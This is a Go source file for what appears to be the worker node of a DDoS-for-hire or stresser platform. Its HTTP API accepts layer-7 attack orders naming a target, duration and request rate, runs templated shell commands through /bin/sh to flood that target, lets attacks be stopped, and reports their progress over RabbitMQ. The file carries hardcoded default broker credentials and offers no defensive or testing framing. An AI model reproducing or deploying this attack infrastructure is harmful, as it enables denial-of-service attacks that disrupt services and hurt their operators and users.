package main

import (
	"attack-node/commands"
	"attack-node/configs"
	"context"
	"encoding/json"
	amqp "github.com/rabbitmq/amqp091-go"
	"log"
	"math"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"text/template"
	"time"
)

var active int64
var statusChannel *amqp.Channel
var statusMu sync.Mutex
var processMu sync.Mutex
var processes = map[int]context.CancelFunc{}
var cancelled = map[int]bool{}

type healthResponse struct {
	Active int64   `json:"active"`
	CPU    float64 `json:"cpu"`
	Memory float64 `json:"memory"`
}

func main() {
	loadDotEnv(".env")
	if err := commands.Load(getenv("ATTACK_COMMANDS_FILE", "commands.json")); err != nil {
		log.Fatal(err)
	}
	conn, err := amqp.Dial(getenv("RABBITMQ_URL", "amqp://sussybaka:sussybakadeptrai@localhost:5672/"))
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	statusChannel, err = conn.Channel()
	if err != nil {
		log.Fatal(err)
	}
	defer statusChannel.Close()
	queue := getenv("RABBITMQ_ATTACK_STATUS_QUEUE", "attack.status.events")
	if _, err = statusChannel.QueueDeclare(queue, true, false, false, false, nil); err != nil {
		log.Fatal(err)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/health", health)
	mux.HandleFunc("/attacks", attack)
	mux.HandleFunc("/attacks/", stopAttack)
	addr := getenv("HTTP_ADDR", "0.0.0.0:2005")
	log.Printf("attack node listening on %s", addr)
	log.Fatal(http.ListenAndServe(addr, mux))
}

func health(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	cpu, memory := systemUsage()
	json.NewEncoder(w).Encode(healthResponse{
		Active: atomic.LoadInt64(&active),
		CPU:    cpu,
		Memory: memory,
	})
}

// systemUsage returns host-wide CPU and memory usage percentages. Linux exposes
// both values through procfs, which avoids adding a platform-specific runtime
// dependency to the attack node.
func systemUsage() (float64, float64) {
	return roundOneDecimal(cpuUsage()), roundOneDecimal(memoryUsage())
}

func roundOneDecimal(value float64) float64 {
	return math.Round(value*10) / 10
}

func cpuUsage() float64 {
	read := func() (idle, total uint64, ok bool) {
		data, err := os.ReadFile("/proc/stat")
		if err != nil {
			return 0, 0, false
		}
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) < 5 || fields[0] != "cpu" {
				continue
			}
			var values []uint64
			for _, field := range fields[1:] {
				value, err := strconv.ParseUint(field, 10, 64)
				if err != nil {
					return 0, 0, false
				}
				values = append(values, value)
			}
			var sum uint64
			for _, value := range values {
				sum += value
			}
			return values[3] + values[4], sum, true
		}
		return 0, 0, false
	}

	idle1, total1, ok := read()
	if !ok {
		return 0
	}
	time.Sleep(100 * time.Millisecond)
	idle2, total2, ok := read()
	if !ok || total2 <= total1 {
		return 0
	}
	busy := (total2 - total1) - (idle2 - idle1)
	return float64(busy) * 100 / float64(total2-total1)
}

func memoryUsage() float64 {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	var total, available uint64
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		value, err := strconv.ParseUint(fields[1], 10, 64)
		if err != nil {
			continue
		}
		switch fields[0] {
		case "MemTotal:":
			total = value
		case "MemAvailable:":
			available = value
		}
	}
	if total == 0 || available > total {
		return 0
	}
	return float64(total-available) * 100 / float64(total)
}

func attack(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	var raw map[string]any
	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
		http.Error(w, "invalid payload", 400)
		return
	}
	log.Printf("[ATTACK-NODE] request received: %s", string(mustJSON(raw)))
	layer, _ := raw["layer"].(string)
	if layer == "LAYER_4" {
		var x configs.Layer4AttackPayload
		b, _ := json.Marshal(raw)
		if json.Unmarshal(b, &x) != nil {
			http.Error(w, "invalid payload", 400)
			return
		}
		go run4(x)
	} else {
		var x configs.Layer7AttackPayload
		b, _ := json.Marshal(raw)
		if json.Unmarshal(b, &x) != nil {
			http.Error(w, "invalid payload", 400)
			return
		}
		go run7(x)
	}
	log.Printf("[ATTACK-NODE] attack accepted: id=%v layer=%s", raw["id"], layer)
	w.WriteHeader(http.StatusAccepted)
}

func run4(p configs.Layer4AttackPayload) {
	log.Printf("[ATTACK-NODE] attack %d started: layer=LAYER_4 method=%s target=%s", p.ID, p.Method, p.Target)
	atomic.AddInt64(&active, 1)
	defer atomic.AddInt64(&active, -1)
	publishStatus(p.ID, "FAILED", "layer 4 command is not configured", p.SlotKey)
}
func run7(p configs.Layer7AttackPayload) {
	log.Printf("[ATTACK-NODE] attack %d started: method=%s target=%s duration=%ds rate=%d requestMethod=%s", p.ID, p.Method, p.Target, p.Duration, p.RateLimit, p.RequestMethod)
	atomic.AddInt64(&active, 1)
	defer atomic.AddInt64(&active, -1)
	template, ok := commands.Layer7Methods[p.Method]
	if !ok {
		log.Printf("unknown method %s", p.Method)
		publishStatus(p.ID, "FAILED", "unknown method", p.SlotKey)
		return
	}
	log.Printf("[ATTACK-NODE] attack %d command template: %s", p.ID, template)
	command, err := renderCommand(template, p)
	if err != nil {
		publishStatus(p.ID, "FAILED", "invalid attack command template: "+err.Error(), p.SlotKey)
		return
	}
	log.Printf("[ATTACK-NODE] attack %d rendered command: %s", p.ID, command)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(p.Duration+10)*time.Second)
	defer cancel()
	processMu.Lock()
	processes[p.ID] = cancel
	delete(cancelled, p.ID)
	processMu.Unlock()
	defer func() { processMu.Lock(); delete(processes, p.ID); processMu.Unlock() }()
	// /bin/sh is provided by both Ubuntu (dash) and Alpine (BusyBox ash).
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
	cmd.Dir = getenv("ATTACK_SCRIPT_DIR", ".")
	if err := cmd.Start(); err != nil {
		publishStatus(p.ID, "FAILED", err.Error(), p.SlotKey)
		return
	}
	log.Printf("[ATTACK-NODE] attack %d process started", p.ID)
	publishStatus(p.ID, "RUNNING", "", p.SlotKey)
	err = cmd.Wait()
	log.Printf("[ATTACK-NODE] attack %d process finished: err=%v", p.ID, err)
	processMu.Lock()
	wasCancelled := cancelled[p.ID]
	processMu.Unlock()
	if wasCancelled {
		return
	}
	if ctx.Err() == context.DeadlineExceeded {
		publishStatus(p.ID, "TIMEOUT", "attack process exceeded timeout", p.SlotKey)
		return
	}
	if err != nil {
		publishStatus(p.ID, "FAILED", err.Error(), p.SlotKey)
		return
	}
	publishStatus(p.ID, "COMPLETED", "", p.SlotKey)
}

func stopAttack(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	id, err := strconv.Atoi(strings.TrimSuffix(strings.TrimPrefix(r.URL.Path, "/attacks/"), "/stop"))
	if err != nil {
		http.Error(w, "invalid attack id", http.StatusBadRequest)
		return
	}
	processMu.Lock()
	cancel, running := processes[id]
	if running {
		cancelled[id] = true
	}
	processMu.Unlock()
	if !running {
		http.Error(w, "attack not running", http.StatusNotFound)
		return
	}
	log.Printf("[ATTACK-NODE] attack %d stop requested", id)
	cancel()
	publishStatus(id, "CANCELLED", "stopped by user", "")
	w.WriteHeader(http.StatusAccepted)
}

// Commands are defined per method in commands.Layer7Methods. Values are shell
// quoted before template rendering so method templates can safely reference
// payload fields such as {{.Target}} and {{.Rate}}.
func renderCommand(command string, p configs.Layer7AttackPayload) (string, error) {
	t, err := template.New("attack").Parse(command)
	if err != nil {
		return "", err
	}
	data := struct {
		Target, Duration, Rate, RequestMethod, PostData string
	}{
		Target: shellQuote(p.Target), Duration: shellQuote(strconv.Itoa(p.Duration)),
		Rate: shellQuote(strconv.Itoa(p.RateLimit)), RequestMethod: shellQuote(p.RequestMethod),
		PostData: shellQuote(p.PostData),
	}
	var out strings.Builder
	if err := t.Execute(&out, data); err != nil {
		return "", err
	}
	return out.String(), nil
}

func shellQuote(value string) string { return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'" }

func publishStatus(id int, status, reason, slotKey string) {
	log.Printf("[ATTACK-NODE] attack %d status=%s reason=%q", id, status, reason)
	body, _ := json.Marshal(map[string]any{
		"pattern": "attack.updateStatus",
		"data":    map[string]any{"id": id, "status": status, "failureReason": reason, "slotKey": slotKey},
	})
	statusMu.Lock()
	defer statusMu.Unlock()
	_ = statusChannel.Publish("", getenv("RABBITMQ_ATTACK_STATUS_QUEUE", "attack.status.events"), false, false, amqp.Publishing{DeliveryMode: amqp.Persistent, ContentType: "application/json", Body: body})
}

func mustJSON(value any) []byte {
	b, err := json.Marshal(value)
	if err != nil {
		return []byte(`{"error":"unable to serialize payload"}`)
	}
	return b
}
func getenv(k, fallback string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return fallback
}

func loadDotEnv(path string) {
	b, err := os.ReadFile(filepath.Clean(path))
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("unable to read %s: %v", path, err)
		}
		return
	}
	for _, line := range strings.Split(string(b), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
		value = strings.Trim(value, "\"'")
		if key != "" && os.Getenv(key) == "" {
			_ = os.Setenv(key, value)
		}
	}
}
